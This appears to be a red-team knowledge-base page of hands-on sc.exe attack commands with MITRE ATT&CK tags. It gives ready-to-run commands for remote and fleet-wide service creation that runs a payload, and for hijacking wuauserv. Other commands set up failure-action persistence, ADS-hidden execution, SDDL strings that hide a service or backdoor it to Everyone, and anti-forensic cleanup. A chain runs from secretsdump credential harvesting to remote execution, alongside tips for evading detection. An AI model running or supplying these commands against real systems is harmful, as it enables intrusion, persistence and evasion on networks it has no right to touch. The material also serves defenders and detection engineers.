# LOLBins — sc.exe — Hands-On Use Cases

Full commands for every scenario named in `01 - Overview.md`'s Quick Use-Case List, each tagged with its MITRE ATT&CK technique(s). Reminder from that file: **every option below needs the trailing `=` and a following space** (`binpath= C:\svc.exe`), and `\\target` is always the leading positional argument, never a trailing flag.

## Contents
- [Local Service Creation and Start](#local-service-creation-and-start)
- [Remote Service Creation over \\target](#remote-service-creation-over-target)
- [Fleet-Wide Remote Creation and Start](#fleet-wide-remote-creation-and-start)
- [binPath Hijack of an Existing Service](#binpath-hijack-of-an-existing-service)
- [Delayed-Auto Persistence](#delayed-auto-persistence)
- [Failure-Action Persistence Hook](#failure-action-persistence-hook)
- [ADS-Embedded binPath Execution](#ads-embedded-binpath-execution)
- [Custom Run-As Account](#custom-run-as-account)
- [Service DACL Hiding](#service-dacl-hiding)
- [Service DACL Backdoor Grant](#service-dacl-backdoor-grant)
- [Recon and Situational Awareness](#recon-and-situational-awareness)
- [Cleanup and Anti-Forensics](#cleanup-and-anti-forensics)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)
- [Chained Workflow After Credential Harvesting](#chained-workflow-after-credential-harvesting)

---

## Local Service Creation and Start

The baseline primitive — create a service pointing at an already-staged binary, then start it. Runs as SYSTEM by default (`obj=` omitted).

```
sc create SysHelperSvc binpath= "C:\Windows\Temp\evil.exe" start= demand
sc start SysHelperSvc
```

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/) (service creation) + [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (the `start` execution step).

## Remote Service Creation over \\target

The raw SCM primitive PsExec and `psexec.py` automate — a session must already exist (see Prerequisites in `01`). Establishing that session, if not already held, is a separate step:

```
net use \\10.10.10.5\IPC$ /user:CONTOSO\admin "P@ssw0rd!"

sc \\10.10.10.5 create SysHelperSvc binpath= "C:\Windows\Temp\evil.exe" start= demand
sc \\10.10.10.5 start SysHelperSvc
```

`binPath` here must already be reachable from the target — e.g. staged moments earlier via `copy evil.exe \\10.10.10.5\C$\Windows\Temp\evil.exe` or an equivalent drop over `ADMIN$`/`C$`. `sc.exe` performs no upload of its own.

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/) + [T1569.002](https://attack.mitre.org/techniques/T1569/002/) + [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (the `net use \\target\IPC$` session establishment).

## Fleet-Wide Remote Creation and Start

The same two-call sequence issued against many targets — the shape a worm, ransomware affiliate, or C2-tasking-at-scale operation takes:

```powershell
$targets = Get-Content C:\ops\hosts.txt
foreach ($t in $targets) {
    sc.exe "\\$t" create SysHelperSvc binpath= "C:\Windows\Temp\evil.exe" start= demand
    sc.exe "\\$t" start  SysHelperSvc
}
```

Requires a session or credential context valid against every target in the list — in practice, a domain account with local-admin rights on the fleet.

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/) + [T1569.002](https://attack.mitre.org/techniques/T1569/002/) at scale.

## binPath Hijack of an Existing Service

Reuses an already-trusted, already-installed service rather than creating a new one — per `01 - Overview.md`'s red-flag callout, this does **not** fire System 7045 or Security 4697, since those are install-only events.

```
sc qc wuauserv
REM record the original BINARY_PATH_NAME and START_TYPE before touching anything

sc config wuauserv binpath= "C:\Windows\Temp\evil.exe"
sc stop wuauserv
sc start wuauserv

REM restore afterward if OPSEC calls for it
sc config wuauserv binpath= "C:\Windows\System32\svchost.exe -k netsvcs -p"
```

Restarting a live service to trigger the new `binPath` is itself a visible stop/start pair (System 7036) — an operator prioritizing stealth over immediacy may instead leave the hijacked `binPath` in place and wait for the service's next natural start (service crash-and-recover, or next boot for an `auto`-start service), trading speed for one fewer observable control event.

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/) + [T1569.002](https://attack.mitre.org/techniques/T1569/002/).

## Delayed-Auto Persistence

Sets a service (new or hijacked) to start a short interval after boot, alongside the batch of legitimate `delayed-auto` services Windows itself schedules there — blending into a busy, expected startup window rather than the more heavily-scrutinized boot-critical `auto`-start set.

```
sc create SysHelperSvc binpath= "C:\Windows\Temp\evil.exe" start= delayed-auto
```

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/).

## Failure-Action Persistence Hook

A separate trigger from `binPath` — this command only runs if the named service later crashes or stops unexpectedly. Useful either as a secondary persistence path bolted onto an otherwise-legitimate service, or paired with a service the operator deliberately destabilizes.

```
sc failure SysHelperSvc reset= 0 actions= run/0 command= "C:\Windows\Temp\evil.exe"
```

`reset= 0` means the failure counter never resets (every stop counts as a fresh failure); `actions= run/0` runs the `command=` payload immediately (0 ms delay) on that failure.

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/).

## ADS-Embedded binPath Execution

The technique LOLBAS actually catalogues for `sc.exe` — verified against the live [`Sc.yml`](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Sc.yml). A binary's bytes are hidden inside an NTFS Alternate Data Stream on an otherwise innocuous-looking file, and `binPath` points directly at the stream:

```
sc create evilservice binpath= "\"C:\ADS\file.txt:cmd.exe\" /c calc.exe" start= auto
sc start evilservice
```

The `config` variant applies the identical trick to an existing service instead of creating a new one:

```
sc config ExistingSvc binpath= "\"C:\ADS\file.txt:cmd.exe\" /c calc.exe"
sc start ExistingSvc
```

**MITRE ATT&CK:** [T1564.004](https://attack.mitre.org/techniques/T1564/004/) (Hide Artifacts: NTFS File Attributes) + [T1543.003](https://attack.mitre.org/techniques/T1543/003/).

## Custom Run-As Account

Runs the service payload as a specified account instead of the SYSTEM default — useful for blending among legitimate service accounts, or a deliberately lower-privileged foothold that avoids SYSTEM-execution-focused detection logic.

```
sc create UpdateHelper binpath= "C:\Windows\Temp\evil.exe" obj= CONTOSO\svc_update password= "SvcP@ss1" start= demand
sc start UpdateHelper
```

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/).

## Service DACL Hiding

Applies a deny-ACE pattern to a service's own security descriptor so `services.exe`, `Get-Service`, and `sc query` alike stop enumerating it — documented by SANS's ["Red Team Tactics: Hiding Windows Services"](https://www.sans.org/blog/red-team-tactics-hiding-windows-services) and mirrored by the [SigmaHQ `proc_creation_win_sc_sdset_hide_sevices`](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sc_sdset_hide_sevices.yml) detection rule, which keys on the literal `DCLCWPDTSD` access-mask substring shown below:

```
sc sdshow SysHelperSvc
REM record the original SDDL before overwriting it

sc sdset SysHelperSvc D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
```

The `D;;DCLCWPDTSD;;;<trustee>` blocks **deny** Delete-Child/List-Contents/Write-Property/Delete-Tree/Standard-Delete to Interactively-logged-on users (`IU`), Service-logon accounts (`SU`), and Built-in Administrators (`BA`) — stripping the `LC` (List Contents) right specifically is what makes standard enumeration APIs skip the service entirely, per the SANS author's own direct testing. A hidden service is still individually addressable by exact name — `Set-Service -Name SysHelperSvc -Status Stopped` (or `sc query SysHelperSvc` directly) returns **"Access is denied"** rather than "the specified service does not exist," which is the behavioral tell that reveals its presence (see `05 - Detection and Hunting.md`).

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/) with a defense-evasion intent — no dedicated sub-technique ID exists for this specific DACL-hiding pattern (see `01 - Overview.md`'s Techniques/Protocols table).

## Service DACL Backdoor Grant

The inverse of hiding — grants a normally-unprivileged account rights over an already-privileged (often SYSTEM-context) service, so it can be reconfigured, started, or stopped later without re-elevating:

```
sc sdset SysHelperSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPDTLOCR;;;WD)
```

The trailing `(A;;RPWPDTLOCR;;;WD)` ACE grants Read-Property/Write-Property/Delete/Enumerate-Dependents/query-status/read-control to `WD` (Everyone) — any authenticated user (including a subsequently-compromised low-privilege account) can now reconfigure or control this service's `binPath` without needing local-admin rights at that later point in time.

**MITRE ATT&CK:** [T1543.003](https://attack.mitre.org/techniques/T1543/003/) as a persistence/privilege-escalation backdoor.

## Recon and Situational Awareness

Enumerating installed services, their current `binPath`/run-as account, and running process IDs — pre-attack targeting, or identifying which security/monitoring services are present before attempting to disable or evade them.

```
sc query state= all
sc queryex type= service
sc qc wscsvc
sc qc WinDefend
```

**MITRE ATT&CK:** [T1007 — System Service Discovery](https://attack.mitre.org/techniques/T1007/).

## Cleanup and Anti-Forensics

Removing a service after use — mirrors the cleanup step Impacket's `psexec.py`/`smbexec.py` perform automatically (see [`Impacket/psexec/01 - Overview.md`](<../../Impacket/psexec/01 - Overview.md>) and [`Impacket/smbexec/01 - Overview.md`](<../../Impacket/smbexec/01 - Overview.md>)), except `sc.exe` never does this on its own — an operator must issue it explicitly.

```
sc \\10.10.10.5 stop SysHelperSvc
sc \\10.10.10.5 delete SysHelperSvc
```

`delete` removes the registry subkey but has no dedicated "service deleted" Security/System event of its own — see `04 - Target Evidence.md`.

**MITRE ATT&CK:** [T1070 — Indicator Removal](https://attack.mitre.org/techniques/T1070/) (the cleanup act itself, layered on top of whichever creation/config technique above it follows).

## Renamed or Relocated Binary

Copying `sc.exe` under a different name/path to dodge simple image-name-keyed detection rules — the binary itself is unmodified and Authenticode-signed regardless of what it's called, so signature- or hash-based rules survive this even though `Image =`/`OriginalFileName`-agnostic ones don't.

```
copy C:\Windows\System32\sc.exe C:\Users\Public\svcctl64.exe
C:\Users\Public\svcctl64.exe create SysHelperSvc binpath= "C:\Windows\Temp\evil.exe" start= demand
```

**MITRE ATT&CK:** [T1036.003 — Masquerading: Rename System Utilities](https://attack.mitre.org/techniques/T1036/003/), layered on top of whichever `sc.exe` technique above it's paired with.

## Chained Workflow After Credential Harvesting

`sc.exe` as the "last mile" execution step once a session already exists — a realistic chain that starts with a separate Impacket tool for credential access, then uses raw `sc.exe` (rather than `psexec.py`'s own SCM wrapper) for execution, e.g. to avoid the RemCom-derived binary's fingerprint documented in [`Impacket/psexec/04 - Target Evidence.md`](<../../Impacket/psexec/04 - Target Evidence.md>):

```
# 1. Harvest credentials (see Impacket/secretsdump/ for the full workflow)
secretsdump.py CONTOSO/admin:'P@ssw0rd!'@10.10.10.5

# 2. Stage a payload and establish a session with the recovered material
net use \\10.10.10.6\IPC$ /user:CONTOSO\admin <recovered-hash-or-password>
copy evil.exe \\10.10.10.6\C$\Windows\Temp\evil.exe

# 3. Execute via raw sc.exe rather than psexec.py's own service wrapper
sc \\10.10.10.6 create SysHelperSvc binpath= "C:\Windows\Temp\evil.exe" start= demand
sc \\10.10.10.6 start SysHelperSvc
sc \\10.10.10.6 delete SysHelperSvc
```

**MITRE ATT&CK:** [T1003](https://attack.mitre.org/techniques/T1003/) (credential access, step 1) → [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (session establishment, step 2) → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) + [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (execution, step 3).
